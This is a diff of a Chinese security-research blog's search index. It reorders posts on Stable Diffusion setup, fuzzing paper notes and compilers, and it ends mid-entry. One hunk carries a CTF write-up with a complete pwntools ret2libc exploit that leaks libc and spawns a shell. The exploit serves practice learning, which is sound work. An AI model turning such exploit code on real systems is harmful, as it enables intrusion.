@@ -1,10 +1,58 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>My First Blog</title>
-    <url>/posts/8a2ade14.html</url>
-    <content><![CDATA[<p>Creat a small Utopia On the Internet.</p>
+    <title>鼠标右键添加新建md文档</title>
+    <url>/posts/feb04467.html</url>
+    <content><![CDATA[<p>直接上链接：</p>
+<p><a href="%5B(36%E6%9D%A1%E6%B6%88%E6%81%AF">鼠标右键添加新建.md文档（亲测有效）</a> Windows下右键新建.md文件教程（转）_右键新建md文件_MercyDean的博客-CSDN博客](<a href="https://blog.csdn.net/qq_43564374/article/details/109471694">https://blog.csdn.net/qq_43564374/article/details/109471694</a>))</p>
 ]]></content>
+      <tags>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AI绘图工具以及使用教程</title>
+    <url>/posts/75b509d1.html</url>
+    <content><![CDATA[<h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>先放一下结果吧，本人机器只有GTX1650，所以生成的图片质量以及分辨率十分有限~</p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00001-1891544376.png" alt="00001-1891544376.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00005-1891544376.png" alt="00005-1891544376.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00009-2832915632.png" alt="00009-2832915632.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00036-3604192810.png" alt="00036-3604192810.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00050-4188726228.png" alt="00050-4188726228.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00066-114514.png" alt="00066-114514.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00069-1234567891f55fa507eb30f6a.png" alt="00069-1234567891f55fa507eb30f6a.png"></p>
+<p>大概就是这样，模型可以在<a href="https://civitai.com/">civatai</a>（需魔法）和[Hugging Face](<a href="https://huggingface.co/">Hugging Face – The AI community building the future.</a>)中找。</p>
+<h2 id="stable-diffusion-webui工具安装"><a href="#stable-diffusion-webui工具安装" class="headerlink" title="stable-diffusion-webui工具安装"></a>stable-diffusion-webui工具安装</h2><p>[stable-diffusion官网](<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui: Stable Diffusion web UI (github.com)</a>)在这里，可以参照里面的Readme文档指示进行安装。环境Windows，Linux皆可，python版本最好是3.10（否则可能有一些包会安装失败），无需手动安装pytorch，官方Readme文档里有提到点击运行webui-user.bat（Windows系统，后面都是以windows系统为例）即可自动安装相应包体组件。另外一点需要注意，如果你想要使用python虚拟环境，例如conda，可以编辑webui-user.bat中PYTHON的地址为你的conda环境python地址。</p>
+<p>在运行webui-user.bat之前，你需要先下载模型放到指定位置，这里推荐几个模型作为示例，</p>
+<ul>
+<li><a href="%5Bcivitai.com%5D(https://civitai.com/models/4468/counterfeit-v25)">counterfeit-v25</a>(需魔法）：下载得到.safesensor文件放入\stable-diffusion-webui-master\models\Stable-diffusion路径下。这个文件夹下必须至少有一个模型文件，.safesensor, .ckpt文件皆可。</li>
+</ul>
+<p>下面是几个模型文件例子，可以自行百度查找。<img src="https://img.xhacgn.com/images/2023/04/20/a40c51e8c197fdf4871351c6e6868664.png" alt="a40c51e8c197fdf4871351c6e6868664.png"></p>
+<p>然后就可以直接点击运行webui-user.bat文件，运行过程中如果出现报错，请确认你的python版本正确（一般命令行报错信息会提示你），然后如果显示安装失败，那么大概率是网络问题，请检查你的网络配置，代理是否开启，然后关闭命令行重新运行。</p>
+<p>安装好后，就可以按照命令行提示打开<a href="http://127.0.0.1:7860/%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5prompts%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E5%9B%BE%E4%BA%86%EF%BC%81%E5%BD%93%E7%84%B6%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%98%BE%E5%8D%A1%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E4%BA%BA4GB%E6%98%BE%E5%AD%98%E5%B0%B1%E5%8F%AA%E8%83%BD%E7%94%BB%E5%A4%A7%E6%A6%82900x400%E8%BF%99%E4%B8%AA%E5%88%86%E8%BE%A8%E7%8E%87%EF%BC%88%E5%8B%BE%E9%80%89hires.fix%E5%8F%82%E6%95%B0%E5%90%8E%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%8B%BE%E9%80%89%E7%9A%84%E8%AF%9D%E6%9C%80%E5%A4%A7%E4%B9%9F%E5%B0%B1512x512">http://127.0.0.1:7860/然后就可以输入prompts以及各种参数进行AI绘图了！当然一定要注意自己的显卡配置，例如本人4GB显存就只能画大概900x400这个分辨率（勾选hires.fix参数后），不勾选的话最大也就512x512</a>~</p>
+<h2 id="stable-diffusion-web-ui简要介绍"><a href="#stable-diffusion-web-ui简要介绍" class="headerlink" title="stable diffusion web ui简要介绍"></a>stable diffusion web ui简要介绍</h2><p><img src="https://img.xhacgn.com/images/2023/04/20/screenshot.png" alt="screenshot.png"></p>
+<ul>
+<li>stable diffusion checkpoint：你下载的模型，包含在上面提到的文件夹下的所有模型文件，可以选择任何一个模型进行加载。</li>
+<li>Prompts：提示词，AI会根据该提示词进行绘制</li>
+<li>Negative Prompts：负面提示词，AI会尽量避免里面的关键词</li>
+<li>Sampling method：数据采样方式，没什么大影响</li>
+<li>Sampling steps：采样步数，20-50就可以了，当然你再多一些也没关系，就是运行时间会久一些，还没试过效果会不会有明显改善</li>
+<li><strong>Restore faces：</strong>在图象生成后再对面部进行优化，<strong>十分重要！！！</strong></li>
+<li><strong>Hires.fix：</strong>可以将本来较小分辨率的图片再扩展成较大分辨率的图片</li>
+<li>Batch Count：训练几张图片，串行生成</li>
+<li>Batch Size：一次训练几张图片，并行生成</li>
+<li>CFG Scale：AI绘图对Prompt的倾向性有多强。</li>
+<li>Seed：种子，你可以按照我的世界的地图种子来理解。</li>
+</ul>
+<p>可以在<a href="https://civitai.com/">civatai</a>网站中找到自己喜欢的图片，里面会有相应的Prompts等参数，一般而言参数一模一样的话，产生的图也会比较相似。</p>
+<p>下面给一个通用Prompts，用于画二次元少女图的</p>
+<p>Prompt：masterpiece，beat quality，1girl</p>
+<p>Negative Prompt：nsfw,blush,lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts,signature, watermark, username, blurry, artist name,bad feet,big head,fused body,multiple hands,multiple legs,multiple hands,multiple breast,multiple lower legs,multiple thighs,fused body,twist body</p>
+<p>其他参数自己调就可以了。（只要不太过分都是没问题的~~~）</p>
+]]></content>
+      <tags>
+        <tag>教程</tag>
+      </tags>
   </entry>
   <entry>
     <title>BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB</title>
@@ -87,60 +135,6 @@
 ]]></content>
       <tags>
         <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>鼠标右键添加新建md文档</title>
-    <url>/posts/feb04467.html</url>
-    <content><![CDATA[<p>直接上链接：</p>
-<p><a href="%5B(36%E6%9D%A1%E6%B6%88%E6%81%AF">鼠标右键添加新建.md文档（亲测有效）</a> Windows下右键新建.md文件教程（转）_右键新建md文件_MercyDean的博客-CSDN博客](<a href="https://blog.csdn.net/qq_43564374/article/details/109471694">https://blog.csdn.net/qq_43564374/article/details/109471694</a>))</p>
-]]></content>
-      <tags>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AI绘图工具以及使用教程</title>
-    <url>/posts/75b509d1.html</url>
-    <content><![CDATA[<h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>先放一下结果吧，本人机器只有GTX1650，所以生成的图片质量以及分辨率十分有限~</p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00001-1891544376.png" alt="00001-1891544376.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00005-1891544376.png" alt="00005-1891544376.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00009-2832915632.png" alt="00009-2832915632.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00036-3604192810.png" alt="00036-3604192810.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00050-4188726228.png" alt="00050-4188726228.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00066-114514.png" alt="00066-114514.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00069-1234567891f55fa507eb30f6a.png" alt="00069-1234567891f55fa507eb30f6a.png"></p>
-<p>大概就是这样，模型可以在<a href="https://civitai.com/">civatai</a>（需魔法）和[Hugging Face](<a href="https://huggingface.co/">Hugging Face – The AI community building the future.</a>)中找。</p>
-<h2 id="stable-diffusion-webui工具安装"><a href="#stable-diffusion-webui工具安装" class="headerlink" title="stable-diffusion-webui工具安装"></a>stable-diffusion-webui工具安装</h2><p>[stable-diffusion官网](<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui: Stable Diffusion web UI (github.com)</a>)在这里，可以参照里面的Readme文档指示进行安装。环境Windows，Linux皆可，python版本最好是3.10（否则可能有一些包会安装失败），无需手动安装pytorch，官方Readme文档里有提到点击运行webui-user.bat（Windows系统，后面都是以windows系统为例）即可自动安装相应包体组件。另外一点需要注意，如果你想要使用python虚拟环境，例如conda，可以编辑webui-user.bat中PYTHON的地址为你的conda环境python地址。</p>
-<p>在运行webui-user.bat之前，你需要先下载模型放到指定位置，这里推荐几个模型作为示例，</p>
-<ul>
-<li><a href="%5Bcivitai.com%5D(https://civitai.com/models/4468/counterfeit-v25)">counterfeit-v25</a>(需魔法）：下载得到.safesensor文件放入\stable-diffusion-webui-master\models\Stable-diffusion路径下。这个文件夹下必须至少有一个模型文件，.safesensor, .ckpt文件皆可。</li>
-</ul>
-<p>下面是几个模型文件例子，可以自行百度查找。<img src="https://img.xhacgn.com/images/2023/04/20/a40c51e8c197fdf4871351c6e6868664.png" alt="a40c51e8c197fdf4871351c6e6868664.png"></p>
-<p>然后就可以直接点击运行webui-user.bat文件，运行过程中如果出现报错，请确认你的python版本正确（一般命令行报错信息会提示你），然后如果显示安装失败，那么大概率是网络问题，请检查你的网络配置，代理是否开启，然后关闭命令行重新运行。</p>
-<p>安装好后，就可以按照命令行提示打开<a href="http://127.0.0.1:7860/%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5prompts%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E5%9B%BE%E4%BA%86%EF%BC%81%E5%BD%93%E7%84%B6%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%98%BE%E5%8D%A1%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E4%BA%BA4GB%E6%98%BE%E5%AD%98%E5%B0%B1%E5%8F%AA%E8%83%BD%E7%94%BB%E5%A4%A7%E6%A6%82900x400%E8%BF%99%E4%B8%AA%E5%88%86%E8%BE%A8%E7%8E%87%EF%BC%88%E5%8B%BE%E9%80%89hires.fix%E5%8F%82%E6%95%B0%E5%90%8E%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%8B%BE%E9%80%89%E7%9A%84%E8%AF%9D%E6%9C%80%E5%A4%A7%E4%B9%9F%E5%B0%B1512x512">http://127.0.0.1:7860/然后就可以输入prompts以及各种参数进行AI绘图了！当然一定要注意自己的显卡配置，例如本人4GB显存就只能画大概900x400这个分辨率（勾选hires.fix参数后），不勾选的话最大也就512x512</a>~</p>
-<h2 id="stable-diffusion-web-ui简要介绍"><a href="#stable-diffusion-web-ui简要介绍" class="headerlink" title="stable diffusion web ui简要介绍"></a>stable diffusion web ui简要介绍</h2><p><img src="https://img.xhacgn.com/images/2023/04/20/screenshot.png" alt="screenshot.png"></p>
-<ul>
-<li>stable diffusion checkpoint：你下载的模型，包含在上面提到的文件夹下的所有模型文件，可以选择任何一个模型进行加载。</li>
-<li>Prompts：提示词，AI会根据该提示词进行绘制</li>
-<li>Negative Prompts：负面提示词，AI会尽量避免里面的关键词</li>
-<li>Sampling method：数据采样方式，没什么大影响</li>
-<li>Sampling steps：采样步数，20-50就可以了，当然你再多一些也没关系，就是运行时间会久一些，还没试过效果会不会有明显改善</li>
-<li><strong>Restore faces：</strong>在图象生成后再对面部进行优化，<strong>十分重要！！！</strong></li>
-<li><strong>Hires.fix：</strong>可以将本来较小分辨率的图片再扩展成较大分辨率的图片</li>
-<li>Batch Count：训练几张图片，串行生成</li>
-<li>Batch Size：一次训练几张图片，并行生成</li>
-<li>CFG Scale：AI绘图对Prompt的倾向性有多强。</li>
-<li>Seed：种子，你可以按照我的世界的地图种子来理解。</li>
-</ul>
-<p>可以在<a href="https://civitai.com/">civatai</a>网站中找到自己喜欢的图片，里面会有相应的Prompts等参数，一般而言参数一模一样的话，产生的图也会比较相似。</p>
-<p>下面给一个通用Prompts，用于画二次元少女图的</p>
-<p>Prompt：masterpiece，beat quality，1girl</p>
-<p>Negative Prompt：nsfw,blush,lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts,signature, watermark, username, blurry, artist name,bad feet,big head,fused body,multiple hands,multiple legs,multiple hands,multiple breast,multiple lower legs,multiple thighs,fused body,twist body</p>
-<p>其他参数自己调就可以了。（只要不太过分都是没问题的~~~）</p>
-]]></content>
-      <tags>
-        <tag>教程</tag>
       </tags>
   </entry>
   <entry>
@@ -274,16 +268,16 @@
 <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
 <li>使用<code>checksec</code>工具进行查看，程序为64位，NX保护</li>
 </ol>
-
+<img src="/posts/daa10577/checksec.png" class="" title="checksec">
 
 <ol start="2">
 <li>使用ida工具反编译。</li>
 </ol>
 <p><code>main</code>:</p>
-
+<img src="/posts/daa10577/main.png" class="" title="main">
 
 <p><code>encrypt</code>：</p>
-
+<img src="/posts/daa10577/encrypt.png" class="" title="encrypt">
 
 <p>​		可以看出程序功能为对输入字符串进行加密，而加密<code>encrypt</code>函数中的get存在栈溢出漏洞。</p>
 <ol start="3">
@@ -301,7 +295,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26936</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x10a38c</span>  <span class="comment"># 0x4f322, 0x4f2c5, 0x10a38c</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">encrypt = <span class="number">0x4009A0</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, pop_rdi, puts_got, puts_plt, encrypt)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x4009DD&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice!&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nCiphertext\n\n&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - puts_offset</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_addr + one_gadget</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, one_gadget)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your Plaintext to be encrypted&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>成功获取flag</p>
-
+<img src="/posts/daa10577/result.png" class="" title="result">
 ]]></content>
       <tags>
         <tag>教程</tag>
@@ -1018,18 +1012,6 @@
       </tags>
   </entry>
   <entry>
-    <title>linux虚拟机设置github加速</title>
-    <url>/posts/d1a2e76c.html</url>
-    <content><![CDATA[<p>最近在使用vmware虚拟机跑项目复现，需要频繁使用github，因此在此记录下github加速的简单方法</p>
-<p><a href="https://zhuanlan.zhihu.com/p/432414619">https://zhuanlan.zhihu.com/p/432414619</a></p>
-]]></content>
-      <tags>
-        <tag>github</tag>
-        <tag>vmware</tag>
-        <tag>代理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SFuzz论文笔记</title>
     <url>/posts/69313c9b.html</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RTOS系统当下并没有很好的分析方式，因此作者提出了sfuzz工具，利用RTOS每一项任务的控制流都是独立的特点，从RTOS系统中切出独立的代码块进行fuzzing。</p>
@@ -1095,6 +1077,18 @@
         <tag>IoT</tag>
         <tag>Fuzz</tag>
         <tag>固件模拟</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux虚拟机设置github加速</title>
+    <url>/posts/d1a2e76c.html</url>
+    <content><![CDATA[<p>最近在使用vmware虚拟机跑项目复现，需要频繁使用github，因此在此记录下github加速的简单方法</p>
+<p><a href="https://zhuanlan.zhihu.com/p/432414619">https://zhuanlan.zhihu.com/p/432414619</a></p>
+]]></content>
+      <tags>
+        <tag>github</tag>
+        <tag>vmware</tag>
+        <tag>代理</tag>
       </tags>
   </entry>
   <entry>
@@ -1205,6 +1199,48 @@
       </tags>
   </entry>
   <entry>
+    <title>Winnie论文笔记</title>
+    <url>/posts/ce05e772.html</url>
+    <content><![CDATA[<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对当下Windows系统软件的fuzz没有合适的方法。提出了Winnie对Windows闭源软件进行fuzzing。</p>
+<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
+<li>提出了Winnie，可以对Windows闭源软件进行模糊测试</li>
+<li>实现了windows系统的fork方法，使得可以不用每次执行都得从头开始，提高了fuzzing效率，其中fork新进程的速度达到310次&#x2F;s显著高于windows自带CreateProcess91.9次&#x2F;s，与WSL的fork速度相近。</li>
+</ul>
+<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
+<li>由于闭源特性，无法全自动，需要人工参与fuzzer代码的生成</li>
+</ul>
+<h2 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h2><img src="/posts/ce05e772/image-20231220090115449.png" class="" title="image-20231220090115449">
+
+<ul>
+<li><p>生成fuzz代码</p>
+<ul>
+<li>Target Identification：确认二进制程序中可以用于fuzz的输入点（读取用户输入的api或函数）</li>
+<li>Call-seq Recovery：恢复目标程序中函数体内对各个相关targetfunction调用的顺序（类似于fudge）</li>
+<li>Argument Correction：恢复函数体的传入参数</li>
+<li>Control-Data-flow：根据控制流和数据流依赖建立函数中各个api的关系。控制流依赖使用了静态分析，数据流依赖考虑了api的返回值与后面的api参数值的关系（直接用于下一个api参数，指针指向值作为下一个api参数）</li>
+</ul>
+</li>
+<li><p>fork</p>
+<ul>
+<li>新建进程需要与CSRSS进程连接才能正常运行。</li>
+<li>验证fork的子进程确实能够继承父进程变量值；fork实现是CoW（copy-on-write）</li>
+<li>解决了多线程的问题。</li>
+</ul>
+</li>
+<li><p>fuzzing</p>
+<ul>
+<li>使用了fullspeed fuzzing来收集代码覆盖率（根据遇到新的代码块来测算）</li>
+<li><img src="/posts/ce05e772/image-20231220091346384.png" class="" title="image-20231220091346384"></li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>论文复现</tag>
+        <tag>DSE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【SeedLab】Magic Padding Oracle实验报告</title>
     <url>/posts/8f883717.html</url>
     <content><![CDATA[<h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1. Overview"></a>1. Overview</h2><p>Padding Oracle：一些系统在解密密文时，会先验证其填充是否合法，如果不合法则会抛出异常。针对此行为的攻击即为padding oracle攻击</p>
@@ -1255,48 +1291,6 @@
       <tags>
         <tag>密码</tag>
         <tag>Padding Oracle</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Winnie论文笔记</title>
-    <url>/posts/ce05e772.html</url>
-    <content><![CDATA[<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对当下Windows系统软件的fuzz没有合适的方法。提出了Winnie对Windows闭源软件进行fuzzing。</p>
-<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
-<li>提出了Winnie，可以对Windows闭源软件进行模糊测试</li>
-<li>实现了windows系统的fork方法，使得可以不用每次执行都得从头开始，提高了fuzzing效率，其中fork新进程的速度达到310次&#x2F;s显著高于windows自带CreateProcess91.9次&#x2F;s，与WSL的fork速度相近。</li>
-</ul>
-<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
-<li>由于闭源特性，无法全自动，需要人工参与fuzzer代码的生成</li>
-</ul>
-<h2 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h2><img src="/posts/ce05e772/image-20231220090115449.png" class="" title="image-20231220090115449">
-
-<ul>
-<li><p>生成fuzz代码</p>
-<ul>
-<li>Target Identification：确认二进制程序中可以用于fuzz的输入点（读取用户输入的api或函数）</li>
-<li>Call-seq Recovery：恢复目标程序中函数体内对各个相关targetfunction调用的顺序（类似于fudge）</li>
-<li>Argument Correction：恢复函数体的传入参数</li>
-<li>Control-Data-flow：根据控制流和数据流依赖建立函数中各个api的关系。控制流依赖使用了静态分析，数据流依赖考虑了api的返回值与后面的api参数值的关系（直接用于下一个api参数，指针指向值作为下一个api参数）</li>
-</ul>
-</li>
-<li><p>fork</p>
-<ul>
-<li>新建进程需要与CSRSS进程连接才能正常运行。</li>
-<li>验证fork的子进程确实能够继承父进程变量值；fork实现是CoW（copy-on-write）</li>
-<li>解决了多线程的问题。</li>
-</ul>
-</li>
-<li><p>fuzzing</p>
-<ul>
-<li>使用了fullspeed fuzzing来收集代码覆盖率（根据遇到新的代码块来测算）</li>
-<li><img src="/posts/ce05e772/image-20231220091346384.png" class="" title="image-20231220091346384"></li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>论文复现</tag>
-        <tag>DSE</tag>
       </tags>
   </entry>
   <entry>
@@ -1477,61 +1471,6 @@
       <tags>
         <tag>Fuzz</tag>
         <tag>模糊测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux内核模块-交叉编译器</title>
-    <url>/posts/b78b50e.html</url>
-    <content><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
-<ul>
-<li>包括编译器、链接器、binutils、glibc、头文件</li>
-<li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
-</ul>
-<h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>编译器的构成</p>
-<ul>
-<li>Frontend：源码分析、语法检查，输出中间代码</li>
-<li>Optimizer：对中间代码进行优化、使其运行更高效</li>
-<li>Backend：将中间代码转换为某一个平台的机器代码</li>
-</ul>
-<p>编译器的实现</p>
-<ul>
-<li>GCC：前端和后端分离，支持多种语言、多个平台。但缺点：前后端耦合高，代码可重用性低。</li>
-<li>LLVM（Low Level Virtual Machine）框架：<strong>模块化设计</strong>，代码可重用性高；中间语言LLVM IR，<strong>类C表达</strong>，<strong>可扩展</strong>各种前端、后端；支持C&#x2F;C++&#x2F;Java等语言</li>
-<li>使用LLVM框架的编译器：<ul>
-<li>LLVM GCC：前端使用GCC（Apple）</li>
-<li>Clang：LLVM+Clang前端（使用C&#x2F;C++）（Apple，Android）</li>
-<li>方舟编译器：编译优化（Java虚拟机，效率提高），鸿蒙系统</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>内核模块</tag>
-        <tag>交叉编译</tag>
-        <tag>gcc</tag>
-        <tag>clang</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DSE论文笔记</title>
-    <url>/posts/25083369.html</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过建立一个比较简单的语法简单中间语言（A simple intermediate language，SIMPIL）。对Dynamic taint analysis和forward symbolic execution进行了讲解。</p>
-<h3 id="SIMPIL"><a href="#SIMPIL" class="headerlink" title="SIMPIL"></a>SIMPIL</h3><img src="/posts/25083369/image-20240105122737426.png" class="" title="image-20240105122737426">
-
-<img src="/posts/25083369/image-20240105122751384.png" class="" title="image-20240105122751384">
-
-<h2 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h2><p><strong>动态污点分析</strong>：跟踪源头与sink点的信息流。任何由污染源推导的值都是污点（T），其他值看作未污染。</p>
-<p><strong>两种错误：</strong></p>
-<ul>
-<li>overtainted：假阳性</li>
-<li>undertainting：假阴性</li>
-</ul>
-<h3 id="动态污点分析策略"><a href="#动态污点分析策略" class="headerlink" title="动态污点分析策略"></a>动态污点分析策略</h3><h4 id="Taint-Introduction"><a href="#Taint-Introduction" class="headerlink" title="Taint Introduction"></a>Taint Introduction</h4><p>将用户输入作为污染源</p>
-<h4 id="Taint-Propagation"><a href="#Taint-Propagation" class="headerlink" title="Taint Propagation"></a>Taint Propagation</h4><h4 id="Taint-Checking"><a href="#Taint-Checking" class="headerlink" title="Taint Checking"></a>Taint Checking</h4><p>查看是否污染</p>
-<h2 id="前向符号执行"><a href="#前向符号执行" class="headerlink" title="前向符号执行"></a>前向符号执行</h2><p>前向符号性可以通过建立逻辑表达式分析程序在不同输入下的行为。属于静态分析。</p>
-]]></content>
-      <tags>
-        <tag>DSE</tag>
       </tags>
   </entry>
   <entry>
@@ -1808,6 +1747,61 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux内核模块-交叉编译器</title>
+    <url>/posts/b78b50e.html</url>
+    <content><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
+<ul>
+<li>包括编译器、链接器、binutils、glibc、头文件</li>
+<li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
+</ul>
+<h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>编译器的构成</p>
+<ul>
+<li>Frontend：源码分析、语法检查，输出中间代码</li>
+<li>Optimizer：对中间代码进行优化、使其运行更高效</li>
+<li>Backend：将中间代码转换为某一个平台的机器代码</li>
+</ul>
+<p>编译器的实现</p>
+<ul>
+<li>GCC：前端和后端分离，支持多种语言、多个平台。但缺点：前后端耦合高，代码可重用性低。</li>
+<li>LLVM（Low Level Virtual Machine）框架：<strong>模块化设计</strong>，代码可重用性高；中间语言LLVM IR，<strong>类C表达</strong>，<strong>可扩展</strong>各种前端、后端；支持C&#x2F;C++&#x2F;Java等语言</li>
+<li>使用LLVM框架的编译器：<ul>
+<li>LLVM GCC：前端使用GCC（Apple）</li>
+<li>Clang：LLVM+Clang前端（使用C&#x2F;C++）（Apple，Android）</li>
+<li>方舟编译器：编译优化（Java虚拟机，效率提高），鸿蒙系统</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>内核模块</tag>
+        <tag>交叉编译</tag>
+        <tag>gcc</tag>
+        <tag>clang</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DSE论文笔记</title>
+    <url>/posts/25083369.html</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过建立一个比较简单的语法简单中间语言（A simple intermediate language，SIMPIL）。对Dynamic taint analysis和forward symbolic execution进行了讲解。</p>
